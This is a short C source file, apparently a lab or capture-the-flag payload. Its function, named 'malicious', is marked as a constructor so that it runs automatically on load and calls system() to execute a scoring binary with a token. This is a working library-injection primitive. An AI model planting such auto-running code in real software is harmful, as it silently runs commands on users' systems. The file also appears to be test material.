#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 93fb9696-2286-4ae3-b50a-7317382a4501");
}
